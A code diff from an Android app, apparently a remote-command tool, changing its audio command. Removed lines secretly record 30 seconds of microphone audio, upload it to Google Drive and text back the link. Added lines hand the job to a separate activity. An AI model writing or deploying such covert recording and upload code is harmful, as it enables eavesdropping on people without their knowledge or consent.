@@ -36,47 +36,10 @@ class AudioCommand(context: Context) : Command(context) {
             return
         }
 
-        // 1. Store locally in cacheDir
-        val outputFile = File(context.cacheDir, "audio_${System.currentTimeMillis()}.m4a")
-        
-        val recorder = MediaRecorder()
-        try {
-            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
-            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-            recorder.setOutputFile(outputFile.absolutePath)
-            recorder.prepare()
-            recorder.start()
+        val dummyAudioActivity = android.content.Intent(context, com.neubofy.veto.ui.DummyAudioActivity::class.java)
+        dummyAudioActivity.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+        context.startActivity(dummyAudioActivity)
 
-            context.log().i(TAG, "Started recording audio for 30s...")
-            transport.send(context, "Recording 30s of stealth audio...", keyword)
-
-            kotlinx.coroutines.delay(30000L) // Record for 30 seconds
-
-            recorder.stop()
-            recorder.release()
-            context.log().i(TAG, "Recording complete. Uploading to Drive...")
-            
-            // 2. Upload to Drive and 3. Clear locally when finished
-            GoogleDriveUploader.uploadFile(
-                context = context,
-                file = outputFile,
-                mimeType = "audio/mp4",
-                type = "audio",
-                onSuccess = { link ->
-                    outputFile.delete() // Clear locally
-                    transport.send(context, "Audio captured: $link", keyword)
-                },
-                onError = { error ->
-                    outputFile.delete() // Clear locally
-                    transport.send(context, "Failed to upload audio: $error", keyword)
-                }
-            )
-        } catch (e: Exception) {
-            context.log().e(TAG, "Audio recording failed: ${e.message}")
-            transport.send(context, "Audio recording failed: ${e.message}", keyword)
-            recorder.release()
-            outputFile.delete() // Clear locally
-        }
+        transport.send(context, "The device is recording 30s of stealth audio. You will receive a link shortly.", keyword)
     }
 }
